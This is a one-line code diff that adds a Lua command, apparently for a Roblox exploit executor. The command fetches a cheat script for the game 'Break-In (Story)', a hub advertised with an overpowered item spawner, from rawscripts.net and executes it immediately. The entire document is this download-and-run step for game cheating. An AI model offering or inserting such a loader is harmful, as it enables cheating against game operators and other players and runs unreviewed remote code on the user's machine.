@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/Break-In-(Story)-Spectravax-Hub-OP-Item-S*er-57305"))()
